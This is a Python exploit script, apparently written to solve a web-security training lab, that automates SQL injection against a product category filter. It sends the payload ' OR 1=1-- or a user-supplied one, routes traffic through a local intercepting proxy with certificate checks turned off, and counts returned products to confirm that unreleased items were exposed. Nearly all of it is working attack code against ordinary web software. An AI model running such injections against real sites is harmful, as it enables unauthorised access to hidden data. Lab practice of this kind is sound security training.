# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

import sys
import requests
import urllib3
import urllib.parse
import re
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def exploit_sqli(s, url, payload):
	print('\n[+] Using payload: %s' % payload)
	r1 = s.get(url)
	time.sleep(1)
	released_count = len(re.findall('productcatalog', r1.text))
	print('[+] Items released in the catalog: %s' % released_count)
	filter_path = url + '/filter?category='
	injection_uri = filter_path + payload
	r2 = s.get(injection_uri)
	time.sleep(1)
	total_count = len(re.findall('productcatalog', r2.text))
	print('[+] Items found in the catalog with injection: %s' % total_count)
	return total_count > released_count

def show_usage():
	print('[+] Usage: %s <URL> <PAYLOAD>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com "\'--"' % sys.argv[0])
	print('[+] Example: %s https://www.target.com SOLUTION\t\t(solve the lab)' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data')
	try:
		url = sys.argv[1].strip()
		if sys.argv[2] == "SOLUTION":
			payload = "' OR 1=1--"
		else:
			payload = sys.argv[2].strip()
	except IndexError:
		show_usage()
	print('[+] Retrieving all products in the list (including non-released).\n')
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	time.sleep(1)
	parsed_url = urllib.parse.urlparse(url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	if exploit_sqli(s, url, payload):
		print('\n[+] SQL Injection successful !')
	else:
		print('\n[-] SQL Injection Failed <!>')

if __name__ == "__main__":
	main()
